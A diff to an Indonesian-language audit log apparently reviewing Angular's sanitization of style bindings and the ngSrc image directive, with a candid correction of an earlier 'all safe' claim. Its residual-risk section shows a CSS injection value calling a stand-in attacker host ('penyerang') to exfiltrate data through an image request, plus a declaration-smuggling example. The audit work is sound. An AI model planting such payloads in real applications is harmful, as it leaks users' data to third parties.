@@ -175,8 +175,44 @@ T-11  unwrap-safevalue (16)  ->  11 SINK-AMAN, 5 SINK-KONTRAK
       PELAJARAN PROSES: klaim "seluruhnya aman" tadi lahir karena saya hanya
       membaca pemanggil di berkas yang sudah saya analisis. Pemindaian pola
       justru menunjuk lima pemanggil di berkas yang BELUM pernah saya baca
-      (styling.ts dan ng_optimized_image.ts - keduanya masih bertanda [ ] di
-      TASKLIST). Inilah nilai konkret memadukan pemindaian dengan triase.
+      (styling.ts dan ng_optimized_image.ts). Inilah nilai konkret memadukan
+      pemindaian dengan triase.
+
+      TINDAK LANJUT - KEDUA BERKAS SUDAH DIANALISIS PENUH:
+        analysis/subsystems/14-core-styling.txt
+        analysis/subsystems/15-common-ng-optimized-image.txt
+      Pembacaan itu mengoreksi lagi alasan keamanannya, kali ini ke arah yang
+      lebih tepat:
+
+      (i) Jalur styling TIDAK PUNYA SANITIZER SAMA SEKALI - bukan sekadar
+          "sanitizernya lemah". `ɵɵstyleProp`/`ɵɵstyleMap` tidak menerima
+          parameter `SanitizerFn`, berbeda dari `ɵɵproperty`/`ɵɵattribute`.
+          Pemetaan SecurityContext.STYLE -> ɵɵsanitizeStyle di
+          resolve_sanitizers.ts:22 hanya berlaku untuk binding properti/atribut
+          biasa, bukan untuk instruksi styling khusus.
+
+      (ii) Yang sebenarnya menahan injeksi adalah BENTUK PENULISANNYA:
+           applyStyling (node_manipulation.ts:1110) memakai
+           `renderer.setStyle(node, prop, value)` - penulisan SATU properti
+           lewat CSSOM. Peramban mem-parse nilai dalam konteks properti itu
+           saja dan membuang yang tidak valid, sehingga `red; background:url(x)`
+           tidak bisa memekarkan diri menjadi deklarasi tambahan.
+           Bandingkan `setAttribute('style', ...)` yang menerima banyak
+           deklarasi - jalur itu hanya dipakai `writeDirectStyle`
+           (dom_node_manipulation.ts:115) untuk nilai STATIS dari compiler.
+
+      (iii) Untuk img: `img[src]` memang bukan konteks RESOURCE_URL di skema
+            keamanan (yang terdaftar hanya script/iframe/object/embed/base/link),
+            sehingga argumen "tidak perlu sanitasi" di komentar kode itu benar.
+
+      SISA RISIKO YANG JUJUR (bukan cacat, tapi perlu diketahui pemakai):
+        - Konteks STYLE praktis tidak disanitasi. Mengikat data pengguna ke
+          `[style.background]` memungkinkan INJEKSI CSS satu-properti, mis.
+          `url(https://penyerang/?d=...)` untuk eksfiltrasi lewat permintaan
+          gambar. Ini bukan XSS.
+        - `ngSrc` dari data pengguna dapat memicu permintaan jaringan ke host
+          arbitrer. Directive menolak `data:` dan `blob:` tetapi tidak membatasi
+          host.
 
 T-12  import-dinamis (2)  ->  BUKAN-KIRIM
       adev/src/app/routing/routes.ts:58 (lazy route, literal) dan
